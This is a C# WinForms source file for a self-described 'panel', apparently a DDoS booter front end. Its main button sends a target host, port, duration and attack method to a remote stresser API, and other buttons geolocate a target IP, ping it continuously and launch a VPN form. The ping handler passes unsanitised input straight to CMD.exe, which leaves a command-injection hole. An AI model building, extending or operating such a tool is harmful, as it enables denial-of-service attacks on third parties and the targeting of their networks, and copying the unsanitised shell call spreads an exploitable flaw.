using System.Net;
using System.Diagnostics;
using System;

namespace hope
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }


        //the next phew text boxes are for the ip port time and method
        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void textBox2_TextChanged(object sender, EventArgs e)
        {

        }

        private void textBox3_TextChanged(object sender, EventArgs e)
        {

        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        //calls out to your api and uses the text boxes make sure to change this to ur api and change the key in the string
        private void button5_Click(object sender, EventArgs e)
        {
            string host = textBox1.Text;
            string port = textBox2.Text;
            string time = textBox3.Text;
            string method = comboBox1.Text;
            string key = "YOUR_API_KEY";
            {
                string attack = new WebClient() { Proxy = null }.DownloadString($"http://google.com/api/api.php?key={key}&host={host}&port={port}&time={time}&method={method}");
                MessageBox.Show(attack);
            }
        }

        //combo box for the method
        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        //makes panel moveable
        public Point mouseLocation;
        private void panel1_MouseMove(object sender, MouseEventArgs e)
        {
            if(e.Button == MouseButtons.Left)
            {
                Point mousePose = Control.MousePosition;
                mousePose.Offset(mouseLocation.X, mouseLocation.Y);
                Location = mousePose;
            }
        }

        private void panel1_MouseUp(object sender, MouseEventArgs e)
        {
            
        }

        //pings the ip you put
        private void button3_Click(object sender, EventArgs e)
        {
            string host = textBox1.Text;
            {
                Process.Start("CMD.exe", "/k ping " + host + " -t");
            }
        }

        //just a label for text
        private void label3_Click(object sender, EventArgs e)
        {

        }

        //exit button
        private void button1_Click_1(object sender, EventArgs e)
        {
            Process.GetCurrentProcess().Kill();
            Form2 frm2 = new Form2();
            Form3 frm3 = new Form3();
            Form4 frm4 = new Form4();
            frm4.Close();
            frm3.Close();
            frm2.Close();
        }

        //minimizes the program
        private void button2_Click_2(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        //shows that the panel is made by me if your gonna use my code might as well give me credit but chances are you wont cause you only know how to skid rip sources
        private void button4_Click_1(object sender, EventArgs e)
        {
            MessageBox.Show("panel made by filtered_ports");
        }

        //part of the moveable panel
        private void panel1_Paint(object sender, PaintEventArgs e)
        {

        }

        //calls out to an api and gives you their ip geolocation
        private void button6_Click(object sender, EventArgs e)
        {
            string host = textBox1.Text;
            {
                string ipgeo = new WebClient() { Proxy = null }.DownloadString($"http://ip-api.com/line/{host}");
                MessageBox.Show(ipgeo);
            }
        }

        //shows your ip
        private void button7_Click(object sender, EventArgs e)
        {
                string myip = new WebClient() { Proxy = null }.DownloadString($"https://api.ipify.org/?format=plain");
                MessageBox.Show(myip);
        }

        //opens the vpn form and closes form 2 which is startup to help the program not stay in the background when exiting
        private void button8_Click(object sender, EventArgs e)
        {
            MessageBox.Show("make sure you have the openvpn file imported and named vpn.ovpn and have openvpn gui");
            Form3 frm3 = new Form3();
            Form2 frm2 = new Form2();
            frm2.Close();
            frm3.Show();
            this.Hide();

        }

        //opens the password gen
        private void button9_Click(object sender, EventArgs e)
        {
            Form4 frm4 = new Form4();
            Form2 frm2 = new Form2();
            this.Close();
            frm2.Close();
            frm4.Show();
        }

        //a part of the moveable panel
        private void panel1_MouseDown(object sender, MouseEventArgs e)
        {
            mouseLocation = new Point(-e.X, -e.Y);
        }
    }
}